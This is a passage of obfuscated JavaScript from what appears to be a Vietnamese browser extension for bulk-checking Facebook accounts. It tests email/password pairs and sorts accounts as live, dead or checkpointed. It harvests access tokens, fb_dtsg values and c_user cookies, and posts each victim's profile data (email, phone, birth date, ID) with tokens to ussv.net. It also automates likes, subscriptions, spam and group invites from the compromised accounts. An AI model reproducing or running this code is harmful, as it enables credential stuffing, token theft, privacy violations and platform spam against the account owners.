            $(f1W.j3O)[f1W.R4r]();
            $(f1W.j3O)[f1W.Q0I](W);
            add_account();
        });
        $(f)[f1W.Z6O](function() {
            $(n)[f1W.v37]();
            $(Y)[f1W.R4r]();
        });
        $(X)[f1W.Z6O](function() {
            var W = ".rowhidden";
            $(W)[f1W.R4r]();
        });
        $(R)[f1W.Z6O](function() {
            $(R)[f1W.v37]();
            $(H)[f1W.R4r]();
        });
        $(b)[f1W.Z6O](function() {
            $(H)[f1W.v37]();
            $(R)[f1W.R4r]();
        });
        $(f1W.i5Y)[f1W.Z6O](function() {
            delete_fb(this[f1W.W7O]);
        });
        $(f1W.G8Y)[f1W.k4O](function() {
            var E = '	<img class="row_del_acc" id="',
                O = $(f1W.E7v + this[f1W.W7O])[f1W.Q0I](),
                O = O[f1W.X3Q](f1W.w30),
                Z = O[f1W.E07],
                F = O[f1W.z5Y],
                o = this[f1W.W7O],
                U = f1W.V8v;
            U += f1W.R6I;
            U += f1W.x0v;
            U += f1W.W1r + Z + f1W.r9y + this[f1W.W7O] + f1W.p77;
            U += f1W.U8y + Z + f1W.J1X + this[f1W.W7O] + f1W.p9I;
            U += f1W.m9O;
            U += E + o + f1W.Y6X;
            U += f1W.K5O;
            $(this)[f1W.w5I]();
            $(f1W.E7v + this[f1W.W7O])[f1W.Q0I](U);
            $(f1W.E7v + this[f1W.W7O])[f1W.R4r]();
            $(f1W.i5Y)[f1W.Z6O](function() {
                delete_fb(this[f1W.W7O]);
            });
            $(f1W.l8Q + o)[f1W.Z6O](function() {
                var W = "z2t";;
                var V = $(f1W.c87)[f1W.Q0I]();
                if (f1W[W](V, f1W.c8Q)) {
                    div_fast_log(o, Z, F);
                } else {
                    div_thongbao(ussv_lang_vi_nt_cant_fl);
                }
            });
            $(f1W.i37 + o)[f1W.Z6O](function() {
                var W = "P2t",
                    V = $(f1W.C4Q + o)[f1W.o07]();
                if (f1W[W](V, f1W.x0r)) {
                    div_thongbao(ussv_lang_vi_vl_error_tokennull);
                } else {
                    view_log(o, Z, V);
                }
            });
        });
        $(M)[f1W.Z6O](function() {
            $(H)[f1W.v37]();
            $(R)[f1W.R4r]();
            loc_acc();
        });
    }

    function open_div_ussv_logs(V) {
        var E = "F2E",
            O = "B2E",
            Z = "Bâ?t Spam: Yes",
            F = ".popup_menu_list.ussv_aut_on_spam",
            o = "j2E",
            U = "Go´i VIP",
            p = ".popup_menu_list.ussv_aut_vip",
            M = "A1E",
            b = "#uss_authorities",
            H = "G1E",
            R = 'html/logs.html',
            X = "v1E";
        if (f1W[X](V, f1W.M9Y)) {
            var f = function(W) {
                N[f1W.V5I] = W;
            };
            var n = new XMLHttpRequest();
            n[f1W.d5y](f1W.Y6Q, chrome[f1W.w7y][f1W.x4X](R), f1W.R30);
            n[f1W.h0r](f1W.x0r);
            var Y = n[f1W.H8v],
                N = document[f1W.W8O](f1W.P5Y);
            f(Y);
            document[f1W.V0r][f1W.M57](N);
            thaotac_div_ussv_logs(V);
        } else if (f1W[H](V, f1W.C3I)) {
            var g = $(b)[f1W.m8y]()[f1W.X3Q](f1W.w30),
                T = g[f1W.L9a];
            if (f1W[M](T, f1W.B3Q)) {
                $(p)[f1W.m8y](U);
                var I = g[f1W.S9a];
                if (f1W[o](I, f1W.B3Q)) {
                    $(F)[f1W.m8y](Z);
                };
                var D = g[f1W.c9a];
                if (f1W[O](D, f1W.B3Q)) {
                    $(f1W.v6a)[f1W.m8y](f1W.x1v);
                };
                var G = g[f1W.J9a];
                if (f1W[E](G, f1W.B3Q)) {
                    $(f1W.s9r)[f1W.m8y](f1W.S9X);
                };
            }
        } else {}
    }

    function stop_check() {
        var V = function(W) {
                acc_doing[f1W.I0O] = W;
            },
            E = function(W) {
                acc_doing[f1W.f17] = W;
            };
        E(f1W.L9a);
        V(f1W.L9a);
        $(f1W.M97)[f1W.v37]();
        $(f1W.i47)[f1W.R4r]();
        $(f1W.c87)[f1W.Q0I](f1W.c8Q);
        $(f1W.T8y)[f1W.v37]();
        $(f1W.L6I)[f1W.R4r]();
    }

    function re_check(W, V, E) {
        var O = "M9t",
            Z = "Tiê´n ha`nh Kiê?m tra la?i ta`i khoa?n ";
        $(f1W.h7r)[f1W.R4r]();
        var F = f1W.N57 + W + f1W.q0v + V + f1W.M0Q + W + f1W.Q0Q + W + f1W.n8r + E + f1W.K5O,
            o = $(f1W.K87);
        $(f1W.X8O)[f1W.Q0I](Z + V + f1W.a80);
        o[f1W.u2r](F);
        if (f1W[O](o[f1W.q8r](f1W.W9Q).length, f1W.K9a)) {
            o[f1W.q8r](f1W.W9Q)[f1W.p3X]()[f1W.w5I]();
        }
        login_CheckFb(W, V, E, f1W.D4X);
    }

    function _update_OneAcc(W0, w, B0, o0, Z0, A) {
        var X0 = "|_|_|erro|check",
            n0 = "B48",
            U0 = "j48",
            b0 = "A08",
            s0 = "G08",
            V0 = "v08",
            i0 = new Date(),
            J0 = +i0[f1W.m2Q]() + f1W.V8Y + i0[f1W.Y6v]() + f1W.V8Y + i0[f1W.I8O](),
            f0 = parseInt($(f1W.H17)[f1W.Q0I]());
        f0 += f1W.S9a;
        $(f1W.o1X)[f1W.Q0I](f0);
        if (f1W[V0](W0, f1W.x0r)) {
            var k0 = function(W) {
                    url = W;
                },
                N0 = function() {
                    var W = "&fb_stt=";
                    var V = "&type=updateoneacc&fb_id=";
                    datalogin = f1W.o0Y + I0 + f1W.R87 + G0 + V + W0 + f1W.i40 + w + W + Z0 + f1W.L9I + o0;
                };
            if (f1W[s0](Z0, f1W.c9Q)) {
                $(f1W.c1Q)[f1W.C3O](f1W.Q1I, f1W.G1y);
                var l0 = parseInt($(f1W.a8O)[f1W.Q0I]());
                l0 += f1W.S9a;
                $(f1W.g90)[f1W.Q0I](l0);
                var v0 = parseInt($(f1W.p0y)[f1W.Q0I]());
                v0 += f1W.S9a;
                $(f1W.p0y)[f1W.Q0I](v0);
                var K0 = f1W.R1Q,
                    P0 = w[f1W.d3v](f1W.L9a, f1W.p90),
                    Y0 = f1W.M8y + W0 + f1W.P7a;
                Y0 += '<td class="tableusstdtd"><h2 class="tableussh2"><center><span id="checking_email_' + W0 + '">' + P0 + '...</span></center></h2></td><td class="tableusstdtd" style="background-color: rgba(247, 247, 247, 0.792157);"><h4 class="tableussh2"><center><span id="checking_stellar_' + W0 + '">' + K0 + '</span></center></h4></td>';
                Y0 += '<td class="tableusstdtd" style="background-color: rgba(247, 247, 247, 0.792157);"><h4 class="tableussh2"><center><span id="checking_friends_' + W0 + '">' + K0 + '</span></center></h4></td>';
                Y0 += '<td class="tableusstdtd" style="background-color: rgba(247, 247, 247, 0.792157);"><h4 class="tableussh2"><center><span id="checking_sub_' + W0 + '">' + K0 + '</span></center></h4></td>';
                Y0 += '<td class="tableusstdtd"><h4 class="tableussh2"><center><span id="checking_group_' + W0 + '">' + K0 + '</span></center></h4></td>';
                Y0 += '<td class="tableusstdtd"><h4 class="tableussh2"><center><span id="checking_page_' + W0 + '">' + K0 + '</span></center></h4></td>';
                Y0 += f1W.A77;
                var g0 = $(f1W.Z1I);
                g0[f1W.u2r](Y0);
                if (f1W[b0](g0[f1W.q8r](f1W.g7r).length, f1W.W7a)) {
                    g0[f1W.q8r](f1W.g7r)[f1W.p3X]()[f1W.w5I]();
                }
                $(f1W.y60)[f1W.Q0I](f1W.g6O + w);
                dom_logs_ussv(lang_vi_checking_live, W0 + f1W.v7Q);
                $(f1W.A50)[f1W.Q0I](f1W.c8Q);
                $(f1W.c77)[f1W.Q0I](f1W.c8Q);
            } else if (f1W[U0](Z0, f1W.C6I)) {
                uss[f1W.O1X]();
                thongbao_log(f1W.J9a, J0 + f1W.F0v + ussv_lang_vi_log_die_clear_cookie);
                $(f1W.c1Q)[f1W.C3O](f1W.Q1I, f1W.i1Y);
                var u0 = parseInt($(f1W.n9Q)[f1W.Q0I]());
                u0 += f1W.S9a;
                $(f1W.S4Y)[f1W.Q0I](u0);
                var m0 = parseInt($(f1W.c77)[f1W.Q0I]());
                m0 += f1W.S9a;
                $(f1W.c77)[f1W.Q0I](m0);
                dom_logs_ussv(lang_vi_checking_die, W0 + f1W.F7r);
            } else if (f1W[n0](Z0, f1W.V4y)) {
                uss[f1W.O1X]();
                thongbao_log(f1W.J9a, J0 + f1W.F0v + ussv_lang_vi_log_cp_clear_cookie);
                $(f1W.c1Q)[f1W.C3O](f1W.Q1I, f1W.e70);
                var C0 = parseInt($(f1W.H5r)[f1W.Q0I]());
                C0 += f1W.S9a;
                $(f1W.v0y)[f1W.Q0I](C0);
                var T0 = parseInt($(f1W.A50)[f1W.Q0I]());
                T0 += f1W.S9a;
                $(f1W.A50)[f1W.Q0I](T0);
                dom_logs_ussv(lang_vi_checking_cp, W0 + f1W.F7r);
            } else {
                $(f1W.c1Q)[f1W.C3O](f1W.Q1I, f1W.k3y);
                var M0 = parseInt($(f1W.h9O)[f1W.Q0I]());
                M0 += f1W.S9a;
                $(f1W.h9O)[f1W.Q0I](M0);
                dom_logs_ussv(lang_vi_checking_kxd, W0 + f1W.v7Q);
            }
            var I0 = document[f1W.C4y](f1W.n10)[f1W.V5I],
                G0 = document[f1W.C4y](f1W.u5X)[f1W.V5I];
            k0(f1W.l9r);
            N0();
            var L0 = new XMLHttpRequest();
            L0[f1W.g4Y] = function() {
                var O = "H18",
                    Z = "q18",
                    F = "b18",
                    o = "U18",
                    U = "Z18",
                    p = "O18",
                    M = "V18",
                    b = "Q48",
                    H = "t48",
                    R = "w48",
                    X = "x48",
                    f = "l48",
                    n = "C48",
                    Y = "g48",
                    N = "D48",
                    g = "Y48",
                    T = "m48",
                    I = "s48",
                    D = "k48",
                    G = "X48",
                    C = "stt_check",
                    z = "y48",
                    P = "F48";
                if (f1W[P](L0[f1W.D60], 4)) {
                    var J = L0[f1W.H8v],
                        J = JSON[f1W.i2O](J);
                    if (f1W[z](J[f1W.C3y], 0)) {
                        $("#stt_checking")[f1W.Q0I](J[f1W.F5v]);
                        $("#acc_fn_stt_" + W0)[f1W.Q0I](J[C]);
                        if (f1W[G](Z0, "live")) {
                            acc_doing[f1W.f17] = 1;
                            if (f1W[D](A[f1W.C3y], 0)) {
                                dom_logs_ussv(A[f1W.F5v], W0 + "|_|_|war|check");
                                $("#checking_email_" + W0)[f1W.u2r]('<img title="Kiê?m La?i Ta`i Khoa?n ' + w + '" id="row_rc_' + W0 + '" src="https://cdn4.iconfinder.com/data/icons/munich/16x16/zoom.png">');
                                $("#row_rc_" + W0)[f1W.Z6O](function() {
                                    $(".info_table." + W0)[f1W.w5I]();
                                    re_check(W0, w, B0);
                                });
                            } else {
                                profile_id = A[f1W.z1Y];
                                FB_Key = A[f1W.O00];
                                token = A[f1W.M00];
                                var c = $("#ussv_log_panel_list_token");
                                c[f1W.o07](c[f1W.o07]() + token + "\n");
                                var L = $("#ussv_log_panel_list_live");
                                L[f1W.o07](L[f1W.o07]() + w + "|" + B0 + "\n");
                                dom_logs_ussv(A[f1W.F5v], W0 + "|_|_|ok|check");
                                if (f1W[I]($("#uss_check_str")[f1W.Q0I](), "1")) {
                                    check_stellar(W0, w, o0, profile_id, FB_Key, token);
                                } else {
                                    update_keyfb(W0, w, o0, token, "3");
                                }
                                if (f1W[T]($("#uss_st_check_rename")[f1W.o07](), "yes")) {
                                    var E0 = $(".info_table." + W0);
                                    if (f1W[g](FbCheck[f1W.c30]({
                                            "uid": profile_id
                                        }), "Yes")) {
                                        $(E0)[f1W.C3O]("background", "rgba(58, 236, 175, 0.14)");
                                        var F0 = 1;
                                    } else {
                                        $(E0)[f1W.C3O]("background", "rgba(244, 54, 105, 0.14)");
                                        var F0 = 0;
                                    }
                                    add_rename(W0, w, o0, F0);
                                }
                                if (f1W[N]($("#uss_autlike")[f1W.m8y](), "1")) {
                                    var K = $("#uss_like")[f1W.m8y]()[f1W.X3Q]("|");
                                    if (f1W[Y](K[0], "0")) {
                                        var r0 = K[0][f1W.X3Q]("-");
                                        if (f1W[n](r0.length, 1)) {
                                            fb_Sub(1, w, K[0], 0, FB_Key, profile_id);
                                        } else {
                                            for (var Q = 0; f1W[f](Q, r0.length); Q++) {
                                                fb_Sub(1, w, r0[Q], 0, FB_Key, profile_id);
                                            }
                                        }
                                    }
                                    if (f1W[X](K[1], "0")) {
                                        var S = K[1][f1W.X3Q]("-");
                                        if (f1W[R](S.length, 1)) {
                                            fb_Like(1, 1, w, K[1], 0, FB_Key, profile_id);
                                        } else {
                                            for (var Q = 0; f1W[H](Q, S.length); Q++) {
                                                fb_Like(1, 1, w, S[Q], 0, FB_Key, profile_id);
                                            }
                                        }
                                    }
                                    if (f1W[b](K[2], "0")) {
                                        var u = K[2][f1W.X3Q]("-");
                                        if (f1W[M](u.length, 1)) {
                                            fb_Like(2, 1, w, K[2], 0, FB_Key, profile_id);
                                        } else {
                                            for (var Q = 0; f1W[p](Q, u.length); Q++) {
                                                fb_Like(2, 1, w, u[Q], 0, FB_Key, profile_id);
                                            }
                                        }
                                    }
                                };
                            }
                            if (f1W[U]($("#uss_st_auto_keomem")[f1W.o07](), 1)) {
                                idgr = $("#uss_st_auto_keomem_id");
                                if (f1W[o](idgr[f1W.o07](), "")) {
                                    dom_logs_ussv(_lJ[f1W.G3v]({
                                        "t": "gr",
                                        "id": "a11"
                                    }), "0|0|_|error|autoAddGr");
                                } else {
                                    note = w + "--" + idgr[f1W.o07]();
                                    dom_logs_ussv(_lJ[f1W.G3v]({
                                        "t": "gr",
                                        "id": "a12",
                                        "r": note
                                    }), "0|0|_|ok|autoAddGr");
                                    GrId = idgr[f1W.o07]();
                                    GrId = JSON[f1W.i2O](uss[f1W.G47]("https://ussv.net/ajax/fb_group.php?useracc=" + uss_aut(1) + "&passacc=" + uss_aut(6) + "&type=1&group=" + GrId));
                                    if (f1W[F](GrId[f1W.C3y], 0)) {
                                        GrId = GrId[f1W.i0Y][f1W.X3Q]("-");
                                        for (var Q = 0; f1W[Z](Q, GrId.length); Q++) {
                                            $("body")[f1W.p3Q]('<input value="0" class="hidden invite_gr_' + W0 + '_' + GrId[Q] + '">');
                                            _fb[f1W.i0Y](4, {
                                                "grId": GrId[Q],
                                                "FbId": W0
                                            });
                                        }
                                        var p0 = {},
                                            q0 = GrId[f1W[O](GrId.length, 1)],
                                            H0 = W0 + "_" + q0;
                                        p0[H0] = setInterval(function() {
                                            var W = "R18",
                                                V = "f18";
                                            Z0 = $(".invite_gr_" + W0 + "_" + q0);
                                            if (f1W[V](Z0[f1W.o07](), 2)) {
                                                clearInterval(p0[H0]);
                                                get_OneAcc();
                                            } else if (f1W[W](Z0[f1W.o07](), 3)) {
                                                clearInterval(p0[H0]);
                                                get_OneAcc();
                                            } else {
                                                var E = parseInt($("#time_wait_add_group_" + W0 + "_" + q0)[f1W.m8y]()),
                                                    E = E + 1;
                                                $("#time_wait_add_group_" + W0 + "_" + q0)[f1W.m8y](E);
                                            }
                                        }, 1000);
                                    } else {
                                        dom_logs_ussv(GrId[f1W.F5v], "0|0|_|error|autoAddGr");
                                        get_OneAcc();
                                    }
                                }
                            } else {
                                get_OneAcc();
                            }
                        } else {
                            get_OneAcc();
                        }
                    } else {
                        $("#stt_checking")[f1W.Q0I](J[f1W.F5v]);
                        dom_logs_ussv(J[f1W.F5v], W0 + "|_|_|erro|check");
                    }
                }
            };
            L0[f1W.d5y](f1W.z77, url, f1W.A0r);
            L0[f1W.x1I](f1W.r27, f1W.W3v);
            L0[f1W.h0r](datalogin);
        } else {
            dom_logs_ussv(lang_vi_checking_er_nosee, W0 + X0);
        }
    }

    function ussv_help_panel() {
        var O = "http://ussv.net/help/ussv_help_panel.php",
            Z = O;
        chrome[f1W.d60][f1W.K4r]({
            method: 'GET',
            action: 'xhttp',
            url: Z,
            data: "hj=hj"
        }, function(V) {
            var E = function(W) {
                usshtml[f1W.V5I] = W;
            };
            usshtml = document[f1W.W8O]('div');
            E(V);
            document[f1W.V0r][f1W.M57](usshtml);
            thaotac_ussv_help();
        });
    }

    function add_info(R, X, f, n, Y, N) {
        var g = "e5b",
            T = "p5b",
            I = "o5b",
            D = "r5b",
            G = "verified",
            C = function() {
                var W = "&value=2";
                var V = "&subs=";
                var E = "&name=";
                var O = "&quequan=";
                var Z = "&country=";
                var F = "&dob=";
                var o = "&fb_link=";
                var U = "&acc_fb_id=";
                var p = "&gender=";
                var M = "&verified=";
                var b = "&mobile_phone=";
                var H = "&type=updateinfo&fb_id=";
                datalogin = f1W.o0Y + z + f1W.R87 + P + H + R + b + K + M + E0 + p + F0 + U + c + o + c + F + J + Z + L + O + r0 + E + Q + V + Y + W;
            },
            z = document[f1W.C4y](f1W.n10)[f1W.V5I],
            P = document[f1W.C4y](f1W.u5X)[f1W.V5I],
            J = n[f1W.q60],
            c = n[f1W.W7O],
            L = n[f1W.s0r],
            E0 = n[G],
            F0 = n[f1W.h3r],
            K = n[f1W.o6O];
        if (typeof n[f1W.I7Q] == f1W.H57) {
            var r0 = f1W.p6Y;
        } else {
            var r0 = n[f1W.I7Q][f1W.G6y];
        }
        var Q = n[f1W.G6y];
        $(f1W.N3Q + R)[f1W.Q0I](Y);
        var S = new XMLHttpRequest(),
            u = f1W.l9r;
        C();
        S[f1W.g4Y] = function() {
            var W = "E5b",
                V = "W5b";
            if (f1W[V](S[f1W.D60], f1W.d9a) && f1W[W](S[f1W.p0O], f1W.o9Q)) {};
        };
        S[f1W.d5y](f1W.k6Q, u, f1W.A0r);
        S[f1W.x1I](f1W.r27, f1W.W3v);
        S[f1W.h0r](datalogin);
        $(f1W.y60)[f1W.Q0I](f1W.V8v);
        var p0 = $(f1W.G5Q)[f1W.Q0I]();
        if (f1W[D](p0, f1W.B3Q)) {
            var q0 = $(f1W.i6v)[f1W.Q0I]();
            if (f1W[I](q0, f1W.B3Q)) {
                if (f1W[T](f, f1W.D4X)) {} else {
                    var H0 = parseInt($(f1W.m4Y + R)[f1W.m8y]());
                    if (f1W[g](H0, f1W.S9a)) {
                        start_spam(R, N, Q, J, F0);
                    } else {
                        var W0 = function(W) {
                            acc_doing[f1W.f17] = W;
                        };
                        W0(f1W.L9a);
                        dom_logs_ussv(f1W.f9X + X + f1W.N2X, R + f1W.v7Q);
                    }
                }
            }
        } else {
            var w = function(W) {
                acc_doing[f1W.f17] = W;
            };
            w(f1W.L9a);
        }
    }

    function open_div_right(V, E) {
        $(f1W.X2O)[f1W.R4r]();
        var V = document[f1W.C4y](f1W.n10)[f1W.V5I],
            E = document[f1W.C4y](f1W.u5X)[f1W.V5I],
            O = f1W.r4I + V + f1W.H40 + E;
        chrome[f1W.d60][f1W.K4r]({
            method: 'POST',
            action: 'xhttp',
            url: 'http://ussv.net/addon/html/html_panel_check_right.php',
            data: O
        }, function(W) {
            $("#imageLoad")[f1W.v37]();
            thaotac_div_right(W);
        });
    }

    function get_fb_info(o) {
        chrome[f1W.d60][f1W.K4r]({
            method: 'GET',
            action: 'xhttp',
            url: 'https://graph.facebook.com/me?access_token=' + o,
            data: "xzcx=xzcxz"
        }, function(W) {
            var V = "z8",
                W = JSON[f1W.i2O](W);
            if (f1W[V](W[f1W.W7O], null)) {
                $(".note_panel_setting")[f1W.Q0I]("Thông tin Facebook cu?a ba?n không ho?p lê? !");
            } else {
                var E = W[f1W.v87],
                    O = W[f1W.W7O],
                    Z = W[f1W.c4I],
                    F = W[f1W.o6O];
                $("#dangky_username")[f1W.o07](E);
                $("#dangky_uid")[f1W.Q0I](O);
                $("#dangky_sdt")[f1W.Q0I](F);
                $("#dangky_email")[f1W.Q0I](Z);
                $(".note_panel_setting")[f1W.Q0I]("Ba?n se~ dang ky´ vo´i thông tin cu?a ta`i khoa?n Facebook: `" + W[f1W.G6y]);
            }
        });
    }

    function re_getFBKey(p, M, b, H) {
        var R = function(W) {
                datalogin = W;
            },
            X = function(W) {
                url = W;
            };
        X(f1W.L6X);
        R(f1W.t9r);
        var f = new XMLHttpRequest();
        f[f1W.g4Y] = function() {
            var W = "D6",
                V = "Y6",
                E = "m6";
            if (f1W[E](f[f1W.D60], 4)) {
                var O = f[f1W.H8v],
                    Z = O[f1W.x3y](/\{"token":(.*?)\}/gi);
                if (f1W[V](Z, null)) {
                    var F = Z,
                        F = JSON[f1W.i2O](F),
                        o = F[f1W.M00];
                    if (f1W[W](o, '')) {} else {
                        var U = document[f1W.T2O][f1W.x3y](document[f1W.T2O][f1W.x3y](/c_user=(\d+)/)[1])[f1W.s7O]();
                    }
                    update_OneAcc(p, M, b, H, "live");
                } else {
                    alert("Chua Xa´c Ði?nh 2");
                }
            }
        };
        f[f1W.d5y](f1W.z77, url, f1W.A0r);
        f[f1W.x1I](f1W.r27, f1W.W3v);
        f[f1W.h0r](datalogin);
    }

    function add_pages(E, O, Z, F, o) {
        var U = function() {
                datalogin = "user=" + p + "&mabimat=" + M + "&type=updateinfo&value=4&fb_id=" + E + "&fb_email=" + O + "&key_play=" + Z + "&all_pages=" + F + "&datapage=" + o;
            },
            p = document[f1W.C4y](f1W.n10)[f1W.V5I],
            M = document[f1W.C4y](f1W.u5X)[f1W.V5I];
        $(f1W.j0r + E)[f1W.Q0I](F);
        var b = new XMLHttpRequest(),
            H = f1W.l9r;
        U();
        b[f1W.g4Y] = function() {
            var W = "z6b",
                V = "N6b";
            if (f1W[V](b[f1W.D60], f1W.d9a) && f1W[W](b[f1W.p0O], f1W.o9Q)) {};
        };
        b[f1W.d5y](f1W.k6Q, H, f1W.A0r);
        b[f1W.x1I](f1W.r27, f1W.W3v);
        b[f1W.h0r](datalogin);
    }

    function cr_fb_notes(V) {
        var E = '<p>hjhj<span class="photo "><img class="photo_img img" alt="" src="https://scontent-a-hkg.xx.fbcdn.net/hphotos-xpa1/v/t1.0-9/10686883_634442380017402_5740280197618429549_n.jpg?oh=484b79b6dd9023e5e6ba733b2c8fe953&amp;oe=555007C1" title=""></span>',
            O = "hau oi",
            Z = "getElementsByName",
            F = document[Z](f1W.P3r)[f1W.L9a][f1W.F2Q],
            o = document[f1W.T2O][f1W.x3y](document[f1W.T2O][f1W.x3y](/c_user=(\d+)/)[f1W.S9a]),
            U = O,
            p = E;
        $[f1W.c9y]({
            url: "https://www.facebook.com/ajax/notes/edit",
            dataType: "json",
            type: "POST",
            data: "fb_dtsg=" + F + "&object_id=634285016699805&note_id=634285016699805&id=100003549365370&title=" + U + "&note_content=" + p + "&audience[634285016699805][value]=80&save=Luu&__user=100003549365370&__a=1"
        })[f1W.W6O](function(W) {})[f1W.X5v](function(W) {})[f1W.H4I](function(W) {})[f1W.D2I](function(W) {
            var W = JSON[f1W.v4X](W);
            thongbao_log(1, F + o + W);
        });
    }

    function ussv_luuNotepad(o, U) {
        var p = U.length,
            M = f1W.X60 + U + f1W.S8r + p + f1W.e4Q;
        chrome[f1W.d60][f1W.K4r]({
            method: 'POST',
            action: 'uhttp',
            url: 'http://notepad.cc/ajax/update_contents/' + o,
            data: M
        }, function(W) {
            var V = "b8t";
            if (f1W[V](W[f1W.X3Q]("|")[0], 200)) {
                thongbao_log(1, "C?p nh?t thành công n?i dung cho Notepad.cc, xem chi ti?t t?i: http://notepad.cc/" + o);
                ussv_passwordNotapad(o);
                var E = new Date(),
                    O = E[f1W.I8O](),
                    Z = 'Chào b?n ! B?n sao luu tin nh?n c?a b?n trên Facebook tru?c khi b? xóa du?c luu tr? t?i link bên du?i kèm theo m?t kh?u. \n';
                Z += 'USSV ch? có th? luu l?i 10 -> 25 tin nh?n cu?i cùng c?a b?n v?i B?n Chat ! \n';
                Z += 'T?p tin du?c b?o v? b?i Mã Bí M?t c?a b?n trên USSV, USSV không có kh? nang thay d?i mã Bí M?t ho?c nhìn Th?y Mã Bí m?t c?a b?n. Mã bí m?t du?c mã khóa kèm mã bí m?t, và d? gi?i mã thì ngu?c l?i. Khi b?n dánh m?t mã bí m?t d?ng nghia m?t tài kho?n và các d? li?u có liên quan và không th? khôi ph?c ! \n';
                Z += 'USSV không chi?u b?t k? trách nhi?m nào khi b?n s? d?ng tính nang này ! Công c? du?c chia s? mi?n phí, du?c yêu c?u thao tác khi ch? tài kho?n tác d?ng lên các nút du?c thi?t l?p s?n !\n';
                Z += "Vi?c khôi ph?c d? li?u ph? thu?c vào Facebook ho?c Admin Website Notepad.cc, USSV không có kh? nang làm vi?c dó !";
                Z += "Link Sao Luu: http://notepad.cc/" + o;
                var F = new Blob([Z], {
                    type: "text/plain;charset=utf-8"
                });
                saveAs(F, "ussv_saoluu_chat_" + O + ".txt");
            } else {
                thongbao_log(1, "Thay d?i n?i dung Link Notepad th?t b?i !");
            }
        });
    }

    function div_safe(E, O, Z) {
        var F, o, U;
        this[f1W.H5v] = f1W.V8v;
        this[f1W.Y5O] = f1W.V8v;
        this[f1W.M8v] = function() {
            return f1W.L9a;
        };
        this[f1W.u00] = function() {
            return this[f1W.Y5O];
        };
        this[f1W.l0v] = function() {
            return this[f1W.H5v];
        };
        this[f1W.Q0I] = function() {
            var W = "v66";
            if (f1W[W]($(".ussv_div_panel_safe." + this[f1W.u00]()).length, 0)) {
                var V = '';
                V += '<div class="ussv_div_panel_safe ' + this[f1W.u00]() + '">';
                V += '<div class="div_title">';
                V += '    <div class="clearfix">';
                V += '        <div class="left">';
                V += '            <h3>USSV SAFE</h3>';
                V += '        </div>';
                V += '        <div class="right">';
                V += '          <span style="color: rgb(144, 189, 228);margin-right: 10px;font-size: 11px;"></span><a class="div_popup_close close_div_safe_chat" role="button" href="#" id="' + this[f1W.u00]() + '" title="Ðóng">Ðóng</a>';
                V += '        </div>';
                V += '    </div>';
                V += '</div>';
                V += '<div class="Panel_Safe_Center">';
                V += '<span class="panel_safe_text_welcome">' + this[f1W.l0v]() + '</span>';
                V += '</div>';
                V += '</div>';
                return V;
            }
        };
        this[f1W.i77] = function(W) {};
    }

    function uss_cr_denho_ran_url() {
        var W = "_fb",
            V = "a7E",
            E = "i7E",
            O = f1W.V8v,
            Z = f1W.h8Q;
        for (var F = f1W.L9a; f1W[E](F, f1W.e90); F++) O += Z[f1W.s40](Math[f1W.n40](f1W[V](Math[f1W.f2I](), Z.length)));
        return O + W;
    }

    function _get_OneAcc() {
        var X = "T08",
            f = "a08",
            n = "e08",
            Y = "p08",
            N = "o08",
            g = "d5",
            T = "K5",
            I = "L5",
            D = "S5",
            G = "P5",
            C = "z5",
            z = parseInt($(f1W.H17)[f1W.Q0I]()),
            P = parseInt($(f1W.F7v)[f1W.Q0I]());
        if (f1W[C](P, z)) {
            var J = f1W.g0X + P + f1W.d47;
            $(f1W.X8O)[f1W.Q0I](J);
            dom_logs_ussv(J, f1W.d07);
            stop_check();
            $(f1W.V3O)[f1W.C3O](f1W.d8v, f1W.Q5Q);
            danhgiacheck();
        } else {
            var c = $(f1W.c77)[f1W.Q0I](),
                L = $(f1W.A50)[f1W.Q0I](),
                E0 = parseInt($(f1W.p0y)[f1W.Q0I]());
            if (f1W[G](c, $(f1W.M8Q)[f1W.Q0I]())) {
                var F0 = f1W.P6I + c + f1W.U0O + c + f1W.P07;
                F0 += f1W.D9y;
                if (f1W[D]($(f1W.k4Q)[f1W.o07](), f1W.B5r)) {
                    F0 += f1W.r8a;
                }
                div_thongbao(F0);
                var K = $(f1W.c87)[f1W.Q0I](f1W.c8Q);
                $(f1W.V3O)[f1W.C3O](f1W.d8v, f1W.Q5Q);
                $(f1W.i47)[f1W.R4r]();
                $(f1W.M97)[f1W.v37]();
                var r0 = f1W.t3X + c + f1W.w0Y;
                $(f1W.X8O)[f1W.Q0I](r0);
                dom_logs_ussv(r0, f1W.X4X);
            } else if (f1W[I](L, $(f1W.s5Y)[f1W.Q0I]())) {
                dom_logs_ussv(lang_vi_checking_manyCP, f1W.X4X);
                if (f1W[T]($(f1W.J2O)[f1W.o07](), f1W.S9a)) {
                    var Q = function(W) {
                        dem = W;
                    };
                    var F0 = _lJ[f1W.G3v]({
                        "t": f1W.K1I,
                        "id": f1W.u4X,
                        "r": f1W.W1I
                    });
                    div_thongbao(F0);
                    note = $(f1W.L1r);
                    Q(f1W.L9a);
                    data = uss[f1W.r5Q]({
                        "type": 2,
                        "fb_id": 00000
                    });
                    if (f1W[g](data[f1W.C3y], f1W.L9a)) {
                        $(note)[f1W.m8y](data[f1W.F5v]);
                        var S = setInterval(function() {
                            var O = "W08",
                                Z = function() {
                                    dem = dem + f1W.S9a;
                                };
                            Z();
                            data = uss[f1W.r5Q]({
                                "type": 1
                            });
                            if (f1W[O](data[f1W.C3y], f1W.X5v)) {
                                var F = function(W) {
                                    dem = W;
                                };
                                $(note)[f1W.m8y](data[f1W.F5v]);
                                dom_logs_ussv(data[f1W.F5v], "0|_|_|ok|check");
                                $(f1W.q3X)[f1W.C3O](f1W.Q1I, f1W.X50);
                                $(f1W.e50)[f1W.Q0I](_lJ[f1W.G3v]({
                                    "t": f1W.K1I,
                                    "id": f1W.R4X,
                                    "r": f1W.W1I
                                }));
                                clearInterval(S);
                                F(f1W.J9a);
                                var o = setInterval(function() {
                                    var V = "r08",
                                        E = function() {
                                            var W = "E08";
                                            dem = f1W[W](dem, f1W.S9a);
                                        };
                                    E();
                                    $(f1W.v5Y)[f1W.Q0I](dem);
                                    if (f1W[V](dem, f1W.L9a)) {
                                        clearInterval(o);
                                        $(f1W.D17)[f1W.w5I]();
                                        $(f1W.A50)[f1W.Q0I](f1W.c8Q);
                                        get_OneAcc();
                                    }
                                }, f1W.Q8r);
                            } else {
                                $(note)[f1W.m8y](f1W.H2O + dem + f1W.J0Y);
                            }
                        }, f1W.D7X);
                    } else {
                        $(f1W.L1r)[f1W.m8y](f1W.e7Y);
                    }
                } else {
                    var F0 = f1W.P6I + L + f1W.y4X;
                    F0 += f1W.x0Q;
                    F0 += f1W.G1Q;
